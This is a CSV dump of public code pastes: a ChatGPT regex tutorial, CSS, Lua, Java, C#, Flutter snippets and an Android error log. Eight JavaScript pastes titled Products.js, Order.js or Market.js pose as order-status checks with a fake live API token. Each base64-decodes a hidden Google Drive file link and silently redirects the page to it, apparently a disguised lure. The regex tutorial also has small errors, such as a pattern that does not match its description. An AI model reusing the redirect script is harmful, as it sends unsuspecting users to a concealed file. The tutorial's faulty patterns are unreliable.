id,title,username,language,date,content
wvTFvATx,Regex,mayankjoin3,Python,Sunday 13th of April 2025 05:00:55 AM CDT,"Set 1: Basics – Literal Matches and Simple Character Classes
Focus: Matching exact strings and basic patterns
Match the word ""India""

Regex: India

Explanation: Matches the exact word ""India"" anywhere in the text.

Match either ""Delhi"" or ""Mumbai""

Regex: Delhi|Mumbai

Explanation: Matches either of the two city names.

Match any single digit (e.g., part of a pincode)

Regex: [0-9]

Explanation: Matches any single digit from 0 to 9.

Match all vowels (useful for analyzing names)

Regex: [aeiouAEIOU]

Explanation: Matches any vowel (both lowercase and uppercase).

Match the word ""Namaste"" exactly at the start of a sentence

Regex: ^Namaste

Explanation: ^ anchors the pattern to the beginning of a line.

Set 2: Quantifiers and Common Formats
Focus: Using +, *, {n}, ?
Match a sequence of 5 digits (Indian pincode)

Regex: \b\d{6}\b

Explanation: Matches exactly 6-digit numbers; \b ensures word boundary.

Match a word like “Ram”, “Rama”, “Ramaa”, etc.

Regex: Rama*

Explanation: Matches ""Ram"", ""Rama"", ""Ramaa"", etc. (a* = 0 or more a's)

Match names starting with 'A' followed by any 2 letters

Regex: A[a-zA-Z]{2}

Explanation: Matches strings like “Ami”, “Aru”, etc.

Match a string that ends with “ji” (e.g., Gandhi ji)

Regex: ji$

Explanation: $ anchors to the end of the string.

Match any word containing at least one vowel

Regex: \b\w*[aeiouAEIOU]\w*\b

Explanation: \w* matches any word with at least one vowel.

Would you like me to continue with the next 5 examples? The next set will start exploring groups, more complex alternation, and Indian-specific formats like phone numbers and vehicle registration numbers.

You said:
Next 5
ChatGPT said:
Great! Here's the next batch.

Set 3: Grouping, Alternation, and Indian-Specific Formats
Focus: Using parentheses (), grouping with |, and applying to real-life Indian formats
Match either “Kolkata” or “Chennai” or “Bengaluru”

Regex: (Kolkata|Chennai|Bengaluru)

Explanation: Grouping with | lets you match any one of these cities.

Match Indian mobile numbers starting with 7, 8, or 9

Regex: [789]\d{9}

Explanation: Matches a 10-digit mobile number starting with 7, 8, or 9.

Match vehicle registration numbers like KA01AB1234

Regex: [A-Z]{2}\d{2}[A-Z]{2}\d{4}

Explanation: Matches Indian vehicle plates (e.g., KA01AB1234, DL09CD6789).

Match PAN card format (e.g., ABCDE1234F)

Regex: [A-Z]{5}[0-9]{4}[A-Z]

Explanation: Matches PAN structure – 5 uppercase letters, 4 digits, 1 uppercase letter.

Match Aadhaar numbers (12-digit format, optional spaces)

Regex: \d{4} ?\d{4} ?\d{4}

Explanation: Matches Aadhaar numbers with or without spaces (e.g., 123456789012 or 1234 5678 9012).

Would you like the next 5 examples to focus on email validation, name patterns, and Indian website formats? Or shall we go deeper into advanced regex concepts like lookaheads, backreferences, etc.?

You said:
Next 5
ChatGPT said:
Perfect! Here's the next set.

Set 4: Indian Names, Emails, and Web Patterns
Focus: Character classes, optional elements, and realistic Indian data
Match typical Indian names starting with capital (e.g., “Amit”, “Suresh”, “Priya”)

Regex: [A-Z][a-z]{2,}

Explanation: Matches a capital letter followed by at least two lowercase letters – good for basic name detection.

Match common Indian email addresses (e.g., raj.kumar@gmail.com)

Regex: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|in)

Explanation: Matches Gmail, Yahoo, etc. ending in .com or .in – commonly used domains in India.

Match Indian website URLs like www.irctc.co.in

Regex: www\.[a-zA-Z0-9\-]+\.(com|in|co\.in)

Explanation: Matches websites ending in common Indian domains like .in and .co.in.

Match names with optional title (e.g., Mr. Sharma, Mrs. Rani)

Regex: (Mr|Mrs|Ms)\.?\s[A-Z][a-z]+

Explanation: Matches optional period after title, then a capitalized surname.

Match hashtags used in Indian context (e.g., #India, #IPL2025)

Regex: #\w+

Explanation: Matches hashtags (words beginning with # and followed by letters/digits).

Let me know if you'd like to continue to the next 5. We can start getting into lookaheads, backreferences, or custom validations like matching date formats (e.g., 13/04/2025), or GSTIN numbers.

You said:
Next
ChatGPT said:
Awesome, let’s keep it rolling!

Set 5: Dates, Times, and Advanced Indian Format Validation
Focus: Date/time patterns, character escapes, and real-world validation
Match Indian date format DD/MM/YYYY (e.g., 13/04/2025)

Regex: \b\d{2}/\d{2}/\d{4}\b

Explanation: Matches dates in day/month/year format with slashes.

Match 24-hour time format (e.g., 14:35, 09:00)

Regex: \b([01]\d|2[0-3]):[0-5]\d\b

Explanation: Validates 00:00 to 23:59 format.

Match Indian currency values (e.g., ?500, ?12,34,567.89)

Regex: ?[0-9,]+(\.\d{2})?

Explanation: Matches ? followed by Indian-style numerals with optional paise.

Match Indian GSTIN (Goods and Services Tax Identification Number)

Regex: \d{2}[A-Z]{5}\d{4}[A-Z]{1}[A-Z\d]{1}[Z]{1}[A-Z\d]{1}

Explanation: Matches the 15-character alphanumeric GSTIN format.

Match Indian STD codes (e.g., 011, 022, 080)

Regex: 0\d{2,3}

Explanation: Matches STD codes starting with 0 and 2–3 digits.

We're halfway through! ??
Ready for the next 5? Shall we continue with lookaheads, validations, or regional language elements (like Hindi text in Unicode)?

You said:
Next
ChatGPT said:
Love the momentum! Here's the next batch.

Set 6: Lookaheads, Word Boundaries, and Unicode (Indian Language Basics)
Focus: Lookaheads, word boundaries, and basic Hindi character matching
Match a word that starts with ""Bharat"" but doesn’t end with ""Mata""

Regex: \bBharat(?!.*Mata)\b

Explanation: Negative lookahead ensures ""Mata"" doesn’t appear after ""Bharat"".

Match a sentence that contains ""India"" only if it's followed by ""is great""

Regex: India(?= is great)

Explanation: Positive lookahead ensures ""India"" is only matched when followed by ""is great"".

Match exact word ""chai"" as a standalone word

Regex: \bchai\b

Explanation: Word boundaries (\b) ensure it doesn’t match ""chaibreak"" or ""masalachai"".

Match Hindi characters (Devanagari script, e.g., ??????)

Regex: [\u0900-\u097F]+

Explanation: Matches one or more characters in the Devanagari Unicode range.

Match sentences ending with ""hai"" (common in spoken Hindi)

Regex: \b\w+\s+hai\.?$

Explanation: Matches lines ending with ""hai"" optionally followed by a period."
srCR3q9m,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:55:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84696/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wR5pDqMf,Untitled,geminilabs,CSS,Sunday 13th of April 2025 04:50:21 AM CDT,".glsr[data-theme] [data-tag]:empty {
  display: none;
}
.glsr[data-theme] .glsr-review:has(.youtube-wrapper) div:has(> [data-tag=""rating""]),
.glsr-modal[data-theme] [data-type]:has(.youtube-wrapper) div:has(> [data-tag=""rating""]) {
  display: none;
}
.youtube-wrapper {
    position: relative;
    width: 100%;
    overflow: hidden;
    padding-bottom: 56.25%; /* 16:9 ratio */
}
.youtube-wrapper iframe {
    border-radius: 5px;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}"
gvEaLhat,Mono pannel,DarkSiders061,Lua,Sunday 13th of April 2025 04:43:03 AM CDT,"--Look throughout the code for comments like this. They explain what to do to change things.

--What side the monitor will be on (change this if needed)
modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
m = peripheral.find(""monitor"") or error(""No monitor attached"", 0)


--button on/off color
bactive = colors.cyan
binactive=colors.gray
--text on/off color
tactive=colors.white
tinactive=colors.black
--Background color
bgcolor = colors.black


buttons = {}
      
      

      function newButton(id,xmin,xmax,ymin,ymax,text,func)
        buttons[id] = {}
        buttons[id][""xmin""] = xmin
        buttons[id][""xmax""] = xmax
        buttons[id][""ymin""] = ymin
        buttons[id][""ymax""] = ymax
        buttons[id][""active""] = false
        buttons[id][""text""] = text
        buttons[id][""func""] = func
        
      end
      ---------------------------------------------------------------------------------
      function printButton(id)
        ymin = buttons[id][""ymin""]
        ymax = buttons[id][""ymax""]
        xmin = buttons[id][""xmin""]
        xmax = buttons[id][""xmax""]
        text = buttons[id][""text""]
        ia = buttons[id][""active""]

       

            width = xmax - xmin
            height = ymax - ymin
            
            if ia then m.setBackgroundColor(bactive) m.setTextColor(tactive)
			else m.setBackgroundColor(binactive) m.setTextColor(tinactive) 
					   
            end
			
            for j = ymin,ymax do
             m.setCursorPos(xmin,j)
              for i = xmin,xmax do

                m.write("" "")

             end

           end 

         
        m.setCursorPos(xmin + width / 2 - #text / 2 + 1,ymin + height / 2)

       m.write(text)
       m.setBackgroundColor(bgcolor)
        
      end
      ----------------------------------------------------------------------------------
      function refreshButtons()
        for i = 1,#buttons do
          printButton(i)
        end
      end
    function checkxy( x,y )
        for i = 1, #buttons do 
          if y >= buttons[i][""ymin""] and y <= buttons[i][""ymax""] then
            if x >= buttons[i][""xmin""] and x <= buttons[i][""xmax""] then

              
              buttons[i][""active""] = not buttons[i][""active""]
              clicked = i
              if buttons[i][""func""] ~= nil then

                buttons[i][""func""]()

                
              end
            end
          end
        end
      end


bool1 = false
bool2 = false
bool3 = false
rs.setBundledOutput(""back"",0)




--White is pigman, Orange is witch, purple is wither skele (Bundled cable)


function start()
	
  if bool1 then
	bool1 = not bool1
	   rs.setOutput(""front"", true)
	   sleep(1)
       rs.setOutput(""front"", false)
  end
end

--You can add more buttons and also change the size of them. The format is startingx,startingy,endingx,endingy,text,function

--The buttons
newButton(1, 2,24,2,6,""Start"",start)
------------------------------------------------



m.clear()
refreshButtons()


--main loop
while true do
	e,side,x,y = os.pullEvent(""monitor_touch"")
	checkxy(x,y)
  
	refreshButtons()
end
"
MTrV92sn,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:40:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77286/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pNiDEiUF,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:24:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c8dsHHQ8,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 04:09:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65788/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kneSTv8t,[NP] Streaming Platform,dzocesrce,Java,Sunday 13th of April 2025 04:05:10 AM CDT,"import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.List;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class TVShow extends Show{

    List<List<Integer>> episodes;
    List<Double> episode_ratings;

    public TVShow(String name, List<String> genres,List<List<Integer>> episodes) {
        super(name, genres);
        this.episodes= episodes;
        this.episode_ratings= new ArrayList<>();
        calculateRating(episodes);
    }

    public void calculateRating(List<List<Integer>> episodes) {
        for(List<Integer> episode : episodes){
            episode_ratings.add(((double)episode.stream().mapToInt(i->i).sum()/episode.stream().count())
                    *Math.min(episode.size()/20.0,1.00));

        }

    }

    @Override
    public double averageRating() {
        return (episode_ratings.stream().sorted(Comparator.reverseOrder()).limit(3).mapToDouble(i->i).sum())/3.00;
    }


    @Override
    public ShowType getShowType() {
        return ShowType.TV_Show;
    }

    @Override
    public String getNumberOfEpisodes() {
        return String.format(""(%d episodes)"",this.episodes.size());
    }


    @Override
    public int compareTo(Show other) {
        return Double.compare(this.averageRating(),other.averageRating());
    }
}

enum ShowType {
    Movie,
    TV_Show
}

abstract class Show implements Comparable<Show> {
    private String name;
    private List<String> genres;

    public Show(String name,List<String> genres) {
        this.name = name;
        this.genres= genres;
    }
    
        public List<String> getGenres() {
        return genres;
    }

    public abstract double averageRating();

    public abstract ShowType getShowType();

    public abstract String getNumberOfEpisodes();


    @Override
    public String toString() {


        return String.format(""%s %s %.4f %s"",getShowType().name().replace(""_"","" ""),name,averageRating(),getNumberOfEpisodes());

    }
}


class StreamingPlatform {
    private List<Show> shows;

    public StreamingPlatform() {
        this.shows = new ArrayList<>();
    }

    public void addItem(String data) {
    String[] parts = data.split("";"");
    String name= parts[0];
    List<String> genres = Arrays.stream(parts[1].split("","")).collect(Collectors.toList());
    List<Integer> ratings = new ArrayList<>();
    List<List<Integer>> episodes = new ArrayList<>();
        if(parts.length<4){
            ratings = Arrays.stream(parts[2].split(""\\s+""))
                    .map(i-> Integer.parseInt(i)).collect(Collectors.toList());
            this.shows.add(new Movie(name,genres,ratings));
        }

        else{
            for(int i=2;i<parts.length;i++){
                ratings = Arrays.stream(parts[i].split(""\\s+"")).skip(1)
                        .map(rating-> Integer.parseInt(rating)).collect(Collectors.toList());
                episodes.add(ratings);
            }
            this.shows.add(new TVShow(name,genres,episodes));
    }


    }

    public void listAllItems(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);

        shows.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));

        printWriter.flush();
    }

    public void listFromGenre(String genre, PrintStream out) {

        PrintWriter printWriter = new PrintWriter(out);

        shows.stream().filter(i-> i.getGenres().contains(genre))
                .sorted(Comparator.reverseOrder())
                .forEach(i->printWriter.println(i));

        printWriter.flush();
    }
}

class Movie extends Show{

    private List<Integer> ratings;
    private ShowType showType;
    public Movie(String name, List<String> genres, List<Integer> ratings) {
        super(name, genres);
        this.ratings= ratings;
        this.showType= ShowType.Movie;
    }


    @Override
    public double averageRating() {
        return ((double)ratings.stream().mapToInt(i->i).sum()/ratings.stream().count())*Math.min(ratings.size()/20.0,1.00) ;

    }

    @Override
    public ShowType getShowType() {
        return ShowType.Movie;
    }

    @Override
    public String getNumberOfEpisodes() {
        return """";
    }

    @Override
    public int compareTo(Show other) {
        return Double.compare(this.averageRating(),other.averageRating());
    }

}


public class StreamingPlatformTest {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        StreamingPlatform sp = new StreamingPlatform();
        while (sc.hasNextLine()){
            String line = sc.nextLine();
            String [] parts = line.split("" "");
            String method = parts[0];
            String data = Arrays.stream(parts).skip(1).collect(Collectors.joining("" ""));
            if (method.equals(""addItem"")){
                sp.addItem(data);
            }
            else if (method.equals(""listAllItems"")){
                sp.listAllItems(System.out);
            } else if (method.equals(""listFromGenre"")){
                System.out.println(data);
                sp.listFromGenre(data, System.out);
            }
        }

    }
}"
pyVNYGWc,Pierwszy,cuniszkiewicz,C#,Sunday 13th of April 2025 03:57:09 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PierwszeZajecia
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string imie, nazwisko, mail;
            int wiek;
            double sredniaOcen;

            Console.Write(""Podaj imię: "");
            imie = Console.ReadLine();
            Console.Write(""Podaj nazwisko: "");
            nazwisko = Console.ReadLine();
            Console.Write(""Podaj wiek: "");
            //wiek = int.Parse(Console.ReadLine());
            wiek = Convert.ToInt32(Console.ReadLine());
            
            Console.Write(""Podaj średnią ocen: "");
            //sredniaOcen = double.Parse(Console.ReadLine());
            sredniaOcen = Convert.ToDouble(Console.ReadLine());

            
            mail = imie + ""."" + nazwisko + ""@byd.pl"";
            


            //Console.WriteLine(""Cześć "" + imie + "" "" + nazwisko + "", wiek: ""+ wiek + "" lat"");
            //Console.WriteLine(""Cześć {0} {1}, wiek: {2} lat"",imie, nazwisko, wiek);
            Console.WriteLine($""Cześć {imie} {nazwisko}, wiek: {wiek} lat"");
           

           

            Console.ReadKey(); //program zaczeka na wciśnięcie przycisku
        }
    }
}

"
VQgFv1Um,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:53:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84417/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
myew2Bng,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:38:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16387/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jTC3R3AR,listile listview flutter,muhaiminurabir,Dart,Sunday 13th of April 2025 03:30:56 AM CDT,"              ListView.builder(
                shrinkWrap: true,
                itemCount: 4,
                itemBuilder: (context, index) {
                  return Container(
                    margin: EdgeInsets.only(bottom: AppSpacing.marginS.bottom),
                    child: Card(
                      color: grey,
                      child: ListTile(
                        contentPadding: EdgeInsets.symmetric(
                            horizontal: AppSpacing.paddingS.horizontal,
                            vertical: AppSpacing.paddingXS.vertical),
                        leading: Image.asset(
                          ""assets/png/Hadith.png"", // Replace with actual URL
                          fit: BoxFit.cover,
                        ),
                        title: Text(
                          ""Taiba Al Diyafah"",
                          style: TextStyle(
                              fontWeight: FontWeight.w700,
                              fontSize: 12,
                              color: textColorPrimary),
                        ),
                        subtitle: Text(""Lorem ipsum dolor sit"",
                            style: TextStyle(
                                fontWeight: FontWeight.w400,
                                fontSize: 12,
                                color: textColorPrimary)),
                        trailing: const Icon(Icons.arrow_forward_ios,
                            color: Colors.green),
                        onTap: () {
                          Navigator.pushNamed(
                            context,
                            RouteNames.discoverDetailsPage,
                            arguments: {'title': ""Ihram""},
                          );
                        },
                      ),
                    ),
                  );
                },
              ),
"
4SbQVRwc,image picture flutter,muhaiminurabir,Dart,Sunday 13th of April 2025 03:29:44 AM CDT,"              Card(
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10)),
                clipBehavior: Clip.hardEdge,
                elevation: 2,
                child: Container(
                  height: 150,
                  decoration: BoxDecoration(
                    color: Colors.white,
                    image: DecorationImage(
                      image: AssetImage(""assets/png/kibla2.png""),
                      fit: BoxFit.fill,
                    ),
                  ),
                  alignment: Alignment.center,
                  padding: AppSpacing.paddingS,
                ),
              ),
"
y2VimpZ2,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:23:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06877/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gDXTJGtT,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 03:07:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
24SC5zdA,2025-04-13T16:55:05.242548,powerampache,PHP,Sunday 13th of April 2025 02:55:06 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - invalid session token"",""errorType"":""system""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.app.ActivityThread.main(ActivityThread.java:9604)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:615)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:936)

scrobble() - "
